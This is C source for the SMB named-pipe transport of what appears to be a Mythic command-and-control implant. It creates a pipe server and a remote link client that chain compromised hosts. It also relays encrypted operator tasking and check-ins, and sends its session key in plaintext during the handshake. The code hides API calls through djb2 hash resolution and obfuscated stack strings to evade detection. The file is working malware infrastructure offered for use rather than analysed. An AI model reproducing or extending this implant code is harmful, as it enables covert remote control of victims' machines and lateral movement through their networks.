#include "config.h"

#include "common.h"
#include "transport_smb.h"
#include "crypto.h"
#include "commands.h"

// ─── SMB P2P transport ───
// Framing (both directions, identical):
//   4-byte big-endian payload length | payload
//   payload = TLV message; encrypted (IV | AES-256-CBC | HMAC-SHA256, the
//   Mythic envelope from crypto.cc) whenever a link session key is
//   established; plaintext only for the initial "link" handshake (mirrors
//   Mythic's encrypted_exchange_check bootstrap).
// The whole frame (prefix + payload) is written as a SINGLE WriteFile /
// read as a SINGLE ReadFile on a message-mode pipe.

#define SMB_MAX_MSG       0x100000  // 1 MiB receive cap
#define TLV_UUID          0x01
#define TLV_COMMAND       0x03
#define TLV_DATA          0x04
#define TLV_STATUS        0x05
#define DELEGATE_RELAY_MAGIC 0xFF   // Magic prefix for delegate relay frames

static HANDLE s_pipe = INVALID_HANDLE_VALUE;
// Session key of the CURRENTLY CONNECTED link client (single pipe instance,
// single-threaded server). Set by the plaintext handshake, used for all
// traffic until DisconnectNamedPipe.
static BYTE s_link_key[32];
static BOOL s_have_link_key = FALSE;

// FlushFileBuffers is not in the Win32 table; resolve it lazily (normal
// hooked kernel32 API - no indirect syscalls).
typedef BOOL (WINAPI *fnFlushFileBuffersPipe)(HANDLE);
static fnFlushFileBuffersPipe get_flush(PINSTANCE inst) {
    static fnFlushFileBuffersPipe pfn = NULL;
    if (pfn) return pfn;
    if (!inst->Win32.GetProcAddress || !inst->Modules.Kernel32) return NULL;
    char name[24];
    const char* src = "FlushFileBuffers";
    int i = 0;
    while (src[i]) { name[i] = src[i]; i++; }
    name[i] = 0;
    pfn = (fnFlushFileBuffersPipe)inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, name);
    return pfn;
}

// ─── local TLV helpers (main.cc's are static to that TU) ───

static DWORD smb_tlv_size(DWORD data_len) {
    return 5 + data_len;
}

static void smb_tlv_pack(BYTE* buf, BYTE type, const BYTE* data, DWORD data_len) {
    buf[0] = type;
    buf[1] = (data_len >> 24) & 0xFF;
    buf[2] = (data_len >> 16) & 0xFF;
    buf[3] = (data_len >> 8)  & 0xFF;
    buf[4] = data_len & 0xFF;
    if (data && data_len > 0)
        es_memcpy(buf + 5, (PVOID)data, data_len);
}

static BOOL smb_tlv_find(const BYTE* buf, DWORD buf_len, BYTE type,
                         const BYTE** out_data, DWORD* out_len) {
    DWORD pos = 0;
    while (pos + 5 <= buf_len) {
        BYTE t = buf[pos];
        DWORD len = ((DWORD)buf[pos+1] << 24) | ((DWORD)buf[pos+2] << 16) |
                    ((DWORD)buf[pos+3] << 8)  | buf[pos+4];
        pos += 5;
        if (len > buf_len - pos) break;
        if (t == type) {
            if (out_data) *out_data = buf + pos;
            if (out_len)  *out_len = len;
            return TRUE;
        }
        pos += len;
    }
    return FALSE;
}

// ─── key-parameterised Mythic envelope (IV | AES-CBC | HMAC) ───
// Same layout as mythic_encrypt/mythic_decrypt in crypto.cc but with an
// explicit key so the server speaks the LINKING CLIENT's key.

typedef LONG (WINAPI *fnSmbGenRandom)(PVOID, PUCHAR, ULONG, ULONG);

static BOOL smb_gen_iv(PINSTANCE inst, BYTE* iv) {
    STK_BCRYPT(_bc);
    PVOID bcrypt = inst->Win32.LoadLibraryA(_bc);
    if (!bcrypt) return FALSE;
    fnSmbGenRandom pGen = (fnSmbGenRandom)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptGenRandom")));
    if (!pGen) return FALSE;
    // BCRYPT_USE_SYSTEM_PREFERRED_RNG
    return pGen(NULL, iv, 16, 0x00000002) == 0;
}

static BOOL smb_encrypt_with_client_key(PINSTANCE inst, const BYTE* plain, DWORD plain_len,
                                        BYTE** out, DWORD* out_len) {
    *out = NULL;
    *out_len = 0;
    if (!s_have_link_key) return FALSE;

    BYTE iv[16] = {0};
    if (!smb_gen_iv(inst, iv)) return FALSE;

    BYTE* ct = NULL;
    DWORD ct_len = 0;
    if (!aes256_encrypt(inst, s_link_key, iv, plain, plain_len, &ct, &ct_len))
        return FALSE;

    DWORD iv_ct_len = 16 + ct_len;
    BYTE* iv_ct = (BYTE*)es_malloc(inst, iv_ct_len);
    if (!iv_ct) { es_free(inst, ct); return FALSE; }
    es_memcpy(iv_ct, iv, 16);
    es_memcpy(iv_ct + 16, ct, ct_len);

    BYTE hmac[32];
    BOOL ok = hmac_sha256(inst, s_link_key, 32, iv_ct, iv_ct_len, hmac);
    es_free(inst, iv_ct);
    if (!ok) { es_free(inst, ct); return FALSE; }

    *out_len = 16 + ct_len + 32;
    *out = (BYTE*)es_malloc(inst, *out_len);
    if (!*out) { es_free(inst, ct); return FALSE; }
    es_memcpy(*out, iv, 16);
    es_memcpy(*out + 16, ct, ct_len);
    es_memcpy(*out + 16 + ct_len, hmac, 32);
    es_free(inst, ct);
    return TRUE;
}

static BOOL smb_decrypt_with_client_key(PINSTANCE inst, const BYTE* blob, DWORD blob_len,
                                        BYTE** out, DWORD* out_len) {
    if (!s_have_link_key) return FALSE;
    if (blob_len < 16 + 16 + 32) return FALSE;

    const BYTE* iv = blob;
    DWORD ct_len = blob_len - 16 - 32;
    const BYTE* ct = blob + 16;
    const BYTE* msg_hmac = blob + 16 + ct_len;

    BYTE computed[32];
    if (!hmac_sha256(inst, s_link_key, 32, blob, 16 + ct_len, computed))
        return FALSE;

    BYTE diff = 0;
    for (int i = 0; i < 32; i++) diff |= computed[i] ^ msg_hmac[i];
    if (diff != 0) return FALSE;

    return aes256_decrypt(inst, s_link_key, iv, ct, ct_len, out, out_len);
}

// ─── framing helpers ───

// Write one frame: 4-byte BE length prefix + payload, single message.
BOOL smb_send_frame(PINSTANCE inst, HANDLE h, const BYTE* payload, DWORD payload_len) {
    if (payload_len > SMB_MAX_MSG - 4) return FALSE;

    BYTE* frame = (BYTE*)es_malloc(inst, 4 + payload_len);
    if (!frame) return FALSE;

    frame[0] = (BYTE)((payload_len >> 24) & 0xFF);
    frame[1] = (BYTE)((payload_len >> 16) & 0xFF);
    frame[2] = (BYTE)((payload_len >> 8)  & 0xFF);
    frame[3] = (BYTE)( payload_len        & 0xFF);
    if (payload && payload_len) es_memcpy(frame + 4, (PVOID)payload, payload_len);

    DWORD written = 0;
    BOOL ok = inst->Win32.WriteFile(h, frame, 4 + payload_len, &written, NULL);
    if (ok && written != 4 + payload_len) ok = FALSE;

    // Block until the peer has read everything - DisconnectNamedPipe after a
    // bare WriteFile would race and discard unread response data.
    if (ok) {
        fnFlushFileBuffersPipe pFlush = get_flush(inst);
        if (pFlush) ok = pFlush(h);
    }

    es_free(inst, frame);
    return ok;
}

// Read one frame into *out (es_malloc'd). Caller frees.
BOOL smb_recv_frame(PINSTANCE inst, HANDLE h, BYTE** out, DWORD* out_len) {
    *out = NULL;
    *out_len = 0;

    // Wait for data as long as the client stays connected. A short timeout
    // here would drop the pipe between the handshake and the first delegate
    // task, leaving the parent with a dead handle. PeekNamedPipe fails with
    // ERROR_BROKEN_PIPE once the client disconnects, which exits the loop.
    DWORD avail = 0;
    BOOL got = FALSE;
    for (;;) {
        if (!inst->Win32.PeekNamedPipe(h, NULL, 0, NULL, &avail, NULL))
            return FALSE;               // client gone / pipe broken
        if (avail > 0) { got = TRUE; break; }
        inst->Win32.Sleep(100);
    }
    if (avail > SMB_MAX_MSG) return FALSE;

    BYTE* buf = (BYTE*)es_malloc(inst, avail);
    if (!buf) return FALSE;

    DWORD total = 0;
    while (total < avail) {
        DWORD got = 0;
        if (!inst->Win32.ReadFile(h, buf + total, avail - total, &got, NULL)) {
            es_free(inst, buf);
            return FALSE;
        }
        if (got == 0) break;
        total += got;
    }
    if (total < 4) { es_free(inst, buf); return FALSE; }

    DWORD msg_len = ((DWORD)buf[0] << 24) | ((DWORD)buf[1] << 16) |
                    ((DWORD)buf[2] << 8)  | buf[3];
    if (msg_len > total - 4) { es_free(inst, buf); return FALSE; }

    BYTE* msg = (BYTE*)es_malloc(inst, msg_len ? msg_len : 1);
    if (!msg) { es_free(inst, buf); return FALSE; }
    if (msg_len) es_memcpy(msg, buf + 4, msg_len);
    es_free(inst, buf);

    *out = msg;
    *out_len = msg_len;
    return TRUE;
}

// ─── pipe creation ───

#ifdef SMB_TRANSPORT
// ── server half (SMB-transport payloads only) ──
static BOOL smb_build_pipe_path(PINSTANCE inst, char* out, DWORD out_sz) {
    // "\\\\.\\pipe\\" + pipename
    const char* prefix = "\\\\.\\pipe\\";
    int p = 0;
    while (prefix[p]) { out[p] = prefix[p]; p++; }
    for (int i = 0; inst->Smb.pipename[i] && (DWORD)p < out_sz - 1; i++)
        out[p++] = inst->Smb.pipename[i];
    out[p] = 0;
    return p > 9;
}

BOOL smb_start_server(PINSTANCE inst) {
    if (s_pipe != INVALID_HANDLE_VALUE) return TRUE;

    char pipe_path[512] = {0};
    if (!smb_build_pipe_path(inst, pipe_path, sizeof(pipe_path))) return FALSE;

    // NOTE: no FILE_FLAG_OVERLAPPED - all I/O on this pipe is synchronous;
    // an overlapped handle driven with synchronous calls is undefined behavior.
    s_pipe = inst->Win32.CreateNamedPipeA(
        pipe_path,
        0x00000003,              // PIPE_ACCESS_DUPLEX
        0x00000004 | 0x00000002, // PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE
        1,                       // single instance
        0x10000,                 // out buffer
        0x10000,                 // in buffer
        0,
        NULL
    );

    if (s_pipe == INVALID_HANDLE_VALUE) return FALSE;
    inst->Smb.pipe = s_pipe;
    return TRUE;
}

// ─── server: handle one connected link client ───

static BOOL smb_serve_client(PINSTANCE inst) {
    BYTE* frame = NULL;
    DWORD frame_len = 0;
    BOOL is_checkin = FALSE;  // tracks checkin response (skip re-encryption)
    if (!smb_recv_frame(inst, s_pipe, &frame, &frame_len) || frame_len == 0) {
        if (frame) es_free(inst, frame);
        return FALSE;
    }

    // Decrypt if a link session key is established, else plaintext handshake.
    BYTE* plain = NULL;
    DWORD plain_len = 0;
    BOOL is_handshake = FALSE;

    if (s_have_link_key) {
        if (!smb_decrypt_with_client_key(inst, frame, frame_len, &plain, &plain_len)) {
            es_free(inst, frame);
            return FALSE;
        }
        es_free(inst, frame);
    } else {
        plain = frame;
        plain_len = frame_len;
        is_handshake = TRUE;
    }

    const BYTE* cmd = NULL; DWORD cmd_len = 0;
    BYTE* resp = NULL;
    DWORD resp_len = 0;

    BOOL is_link_cmd = FALSE;
    if (smb_tlv_find(plain, plain_len, TLV_COMMAND, &cmd, &cmd_len) &&
        cmd_len == 4 &&
        cmd[0] == 'l' && cmd[1] == 'i' && cmd[2] == 'n' && cmd[3] == 'k')
        is_link_cmd = TRUE;

    if (is_handshake && is_link_cmd) {
        // Handshake: DATA = client AES key (32 bytes). Store it as the session
        // key, reply (peer UUID + STATUS 0) encrypted under the client key.
        const BYTE* key = NULL; DWORD key_len = 0;
        if (smb_tlv_find(plain, plain_len, TLV_DATA, &key, &key_len) && key_len == 32) {
            es_memcpy(s_link_key, (PVOID)key, 32);
            s_have_link_key = TRUE;

            DWORD uuid_len = es_strlen(inst->Config.uuid);
            BYTE status_be[4] = {0, 0, 0, 0}; // status 0 (OK)
            DWORD total = smb_tlv_size(uuid_len) + smb_tlv_size(4);
            BYTE* msg = (BYTE*)es_malloc(inst, total);
            if (msg) {
                DWORD pos = 0;
                smb_tlv_pack(msg + pos, TLV_UUID, (const BYTE*)inst->Config.uuid, uuid_len);
                pos += smb_tlv_size(uuid_len);
                smb_tlv_pack(msg + pos, TLV_STATUS, status_be, 4);
                pos += smb_tlv_size(4);
                if (!smb_encrypt_with_client_key(inst, msg, pos, &resp, &resp_len))
                    resp = NULL;
                es_free(inst, msg);
            }
        }
    } else {
        // Normal peer tasking message - same processing as the HTTP loop.
        // Check for delegate relay: parent forwards Mythic-format messages
        // prefixed with DELEGATE_RELAY_MAGIC (0xFF).
        if (plain_len > 1 && plain[0] == DELEGATE_RELAY_MAGIC) {
            // Delegate relay: strip magic prefix, process the Mythic-format
            // message (base64-encoded, UUID-prepended, encrypted with our key).
            // The raw blob after the magic byte is the base64 Mythic message.
            const BYTE* relay_blob = plain + 1;
            DWORD relay_blob_len = plain_len - 1;

            // Base64-decode the relay blob
            extern BYTE* base64_decode(PINSTANCE, const BYTE*, DWORD, DWORD*);
            DWORD decoded_len = 0;
            BYTE* decoded = base64_decode(inst, relay_blob, relay_blob_len, &decoded_len);
            if (decoded && decoded_len > 36) {
                // Strip UUID prefix (36 bytes), decrypt with our payload key
                BYTE* data_ptr = decoded + 36;
                DWORD data_len = decoded_len - 36;

                BYTE* task_plain = NULL; DWORD task_plain_len = 0;
                if (has_encryption_key(inst) &&
                    mythic_decrypt(inst, data_ptr, data_len, &task_plain, &task_plain_len)) {
                    // Process the decrypted TLV task
                    es_smb_process_tasking(inst, task_plain, task_plain_len, &resp, &resp_len);

                    // Build response in Mythic format:
                    // TLV response → encrypt with our payload key → UUID-prepend → base64
                    // (a NULL resp - e.g. the checkin ack - still produces an empty
                    //  Mythic-format response so the parent's relay never hangs)
                    {
                        BYTE* send_data = resp;
                        DWORD send_len = resp_len;
                        if (send_data && has_encryption_key(inst)) {
                            BYTE* enc_r = NULL; DWORD enc_r_len = 0;
                            if (mythic_encrypt(inst, resp, resp_len, &enc_r, &enc_r_len)) {
                                send_data = enc_r;
                                send_len = enc_r_len;
                            }
                            es_free(inst, resp);
                        } else if (!send_data) {
                            // empty payload: just the UUID prefix
                            send_len = 0;
                        }
                        extern BYTE* wrap_with_uuid(PINSTANCE, BYTE*, DWORD, DWORD*);
                        extern BYTE* base64_encode(PINSTANCE, const BYTE*, DWORD, DWORD*);
                        DWORD wrapped_len = 0;
                        BYTE* wrapped = wrap_with_uuid(inst, send_data, send_len, &wrapped_len);
                        if (send_data && send_data != resp) es_free(inst, send_data);
                        if (wrapped) {
                            DWORD b64_len = 0;
                            BYTE* b64 = base64_encode(inst, wrapped, wrapped_len, &b64_len);
                            es_free(inst, wrapped);
                            resp = b64;
                            resp_len = b64_len;
                        } else {
                            resp = NULL;
                            resp_len = 0;
                        }
                    }
                    es_free(inst, task_plain);
                }
                es_free(inst, decoded);
            } else {
                if (decoded) es_free(inst, decoded);
            }
        } else {
        // Standard case: "checkin" command or regular TLV task
        // Special case: "checkin" command → reply with our encrypted checkin blob
        // so the parent can relay it as a delegate to Mythic.
        // is_checkin declared at function scope
        const BYTE* _cmd = NULL; DWORD _cmd_len = 0;
        if (smb_tlv_find(plain, plain_len, TLV_COMMAND, &_cmd, &_cmd_len) &&
            _cmd_len == 7 &&
            _cmd[0]=='c' && _cmd[1]=='h' && _cmd[2]=='e' && _cmd[3]=='c' &&
            _cmd[4]=='k' && _cmd[5]=='i' && _cmd[6]=='n')
            is_checkin = TRUE;

        if (is_checkin) {
            // Build checkin TLV → encrypt with our payload key → UUID-prepend → base64-encode
            extern BYTE* build_checkin_msg(PINSTANCE, DWORD*);
            extern BYTE* wrap_with_uuid(PINSTANCE, BYTE*, DWORD, DWORD*);
            extern BYTE* base64_encode(PINSTANCE, const BYTE*, DWORD, DWORD*);
            DWORD ci_len = 0;
            BYTE* ci_msg = build_checkin_msg(inst, &ci_len);
            if (ci_msg) {
                BYTE* send_data = ci_msg;
                DWORD send_len = ci_len;
                if (has_encryption_key(inst)) {
                    BYTE* enc = NULL; DWORD enc_len = 0;
                    if (mythic_encrypt(inst, ci_msg, ci_len, &enc, &enc_len)) {
                        send_data = enc;
                        send_len = enc_len;
                    }
                    es_free(inst, ci_msg);
                }
                DWORD wrapped_len = 0;
                BYTE* wrapped = wrap_with_uuid(inst, send_data, send_len, &wrapped_len);
                if (send_data != ci_msg) es_free(inst, send_data);
                if (wrapped) {
                    DWORD b64_len = 0;
                    BYTE* b64 = base64_encode(inst, wrapped, wrapped_len, &b64_len);
                    es_free(inst, wrapped);
                    if (b64) {
                        resp = b64;
                        resp_len = b64_len;
                    }
                }
            }
        } else {
            es_smb_process_tasking(inst, plain, plain_len, &resp, &resp_len);
        }
        if (!resp) {
            // Always answer with something so the peer's read never hangs.
            BYTE status_be[4] = {0, 0, 0, 1};
            resp = (BYTE*)es_malloc(inst, smb_tlv_size(4));
            if (resp) {
                smb_tlv_pack(resp, TLV_STATUS, status_be, 4);
                resp_len = smb_tlv_size(4);
            }
        }
        }  // end else (non-delegate-relay)
    }

    es_free(inst, plain);

    if (resp) {
        // Don't re-encrypt checkin response - it's already properly formatted
        // (UUID + mythic_encrypt(TLV) + base64). Only encrypt normal responses.
        if (s_have_link_key && !is_handshake && !is_checkin) {
            BYTE* enc = NULL; DWORD enc_len = 0;
            if (smb_encrypt_with_client_key(inst, resp, resp_len, &enc, &enc_len)) {
                es_free(inst, resp);
                resp = enc;
                resp_len = enc_len;
            }
        }
        smb_send_frame(inst, s_pipe, resp, resp_len);
        es_free(inst, resp);
    }

    return TRUE;  // message handled, ready for next
}

// Session ends when the connection loop breaks (pipe closed or error).
// s_have_link_key is cleared when a new client connects (handshake).

VOID smb_server_loop(PINSTANCE inst) {
    while (inst->Running) {
        if (!smb_start_server(inst)) {
            inst->Win32.Sleep(5000);
            continue;
        }

        BOOL connected = inst->Win32.ConnectNamedPipe(s_pipe, NULL);
        if (!connected && inst->Win32.GetLastError() == 535) // ERROR_PIPE_CONNECTED
            connected = TRUE;

        if (connected) {
            // Serve multiple messages per connection (handshake + checkin + tasks)
            // until the pipe breaks or smb_serve_client returns FALSE.
            while (inst->Running) {
                if (!smb_serve_client(inst)) break;
            }
            s_have_link_key = FALSE;
            inst->Win32.DisconnectNamedPipe(s_pipe);
        } else {
            // Broken pipe: drop the handle and recreate next pass.
            inst->Win32.CloseHandle(s_pipe);
            s_pipe = INVALID_HANDLE_VALUE;
            inst->Smb.pipe = NULL;
            inst->Win32.Sleep(1000);
        }
    }
}

// ─── link client (used by cmd_link) ───


// ── client half (always compiled: link works from any transport) ──
#endif // SMB_TRANSPORT

// client half: always compiled - link works from any transport
BOOL smb_link_connect(PINSTANCE inst, const char* host, const char* pipename, HANDLE* out_pipe) {
    *out_pipe = INVALID_HANDLE_VALUE;

    // "\\\\" + host + "\\pipe\\" + pipename
    char path[768] = {0};
    int p = 0;
    path[p++] = '\\'; path[p++] = '\\';
    for (int i = 0; host[i] && p < 700; i++) path[p++] = host[i];
    const char* mid = "\\pipe\\";
    for (int i = 0; mid[i] && p < 700; i++) path[p++] = mid[i];
    for (int i = 0; pipename[i] && p < 750; i++) path[p++] = pipename[i];
    path[p] = 0;

    HANDLE h = inst->Win32.CreateFileA(
        path,
        0xC0000000,          // GENERIC_READ | GENERIC_WRITE
        0,                   // no sharing
        NULL,
        3,                   // OPEN_EXISTING
        0,                   // synchronous (server pipe is not overlapped)
        NULL
    );

    if (h == INVALID_HANDLE_VALUE) return FALSE;
    *out_pipe = h;
    return TRUE;
}

static DWORD hs_stage = 0;
DWORD smb_last_hs_stage(VOID) { return hs_stage; }

BOOL smb_link_handshake(PINSTANCE inst, HANDLE pipe, char* peer_uuid, DWORD peer_uuid_size) {
    BOOL ok = FALSE;
    hs_stage = 0;
    BYTE* msg = NULL;

    DWORD uuid_len = es_strlen(inst->Config.uuid);
    DWORD total = smb_tlv_size(uuid_len) + smb_tlv_size(4) + smb_tlv_size(32);
    msg = (BYTE*)es_malloc(inst, total);
    if (!msg) return FALSE;

    xstr(_link, "link");

    DWORD pos = 0;
    smb_tlv_pack(msg + pos, TLV_UUID, (const BYTE*)inst->Config.uuid, uuid_len);
    pos += smb_tlv_size(uuid_len);
    smb_tlv_pack(msg + pos, TLV_COMMAND, (const BYTE*)_link, 4);
    pos += smb_tlv_size(4);
    smb_tlv_pack(msg + pos, TLV_DATA, inst->Config.aes_key, 32);
    pos += smb_tlv_size(32);

    // Handshake goes out in plaintext (encrypted_exchange_check equivalent).
    if (!smb_send_frame(inst, pipe, msg, pos)) {
        es_free(inst, msg);
        hs_stage = 1;
        return FALSE;
    }
    es_free(inst, msg);

    BYTE* frame = NULL;
    DWORD frame_len = 0;
    if (!smb_recv_frame(inst, pipe, &frame, &frame_len) || frame_len == 0) {
        if (frame) es_free(inst, frame);
        hs_stage = 2;
        return FALSE;
    }

    // Reply is encrypted under OUR key (the one we just sent) - use the
    // standard Mythic decrypt flow. Payloads without a PSK get plaintext.
    BYTE* plain = NULL;
    DWORD plain_len = 0;
    if (has_encryption_key(inst)) {
        if (!mythic_decrypt(inst, frame, frame_len, &plain, &plain_len)) {
            es_free(inst, frame);
            hs_stage = 3;
            return FALSE;
        }
        es_free(inst, frame);
    } else {
        plain = frame;
        plain_len = frame_len;
    }

    const BYTE* ruuid = NULL; DWORD ruuid_len = 0;
    const BYTE* status = NULL; DWORD status_len = 0;
    if (!(smb_tlv_find(plain, plain_len, TLV_UUID, &ruuid, &ruuid_len) &&
        smb_tlv_find(plain, plain_len, TLV_STATUS, &status, &status_len) &&
        status_len == 4 && status[0] == 0 && ruuid_len < peer_uuid_size)) {
        hs_stage = 4;
    }
    if (smb_tlv_find(plain, plain_len, TLV_UUID, &ruuid, &ruuid_len) &&
        smb_tlv_find(plain, plain_len, TLV_STATUS, &status, &status_len) &&
        status_len == 4 && status[0] == 0 && ruuid_len < peer_uuid_size) {

        es_memcpy(peer_uuid, (PVOID)ruuid, ruuid_len);
        peer_uuid[ruuid_len] = 0;
        ok = TRUE;
    }

    es_free(inst, plain);
    return ok;
}
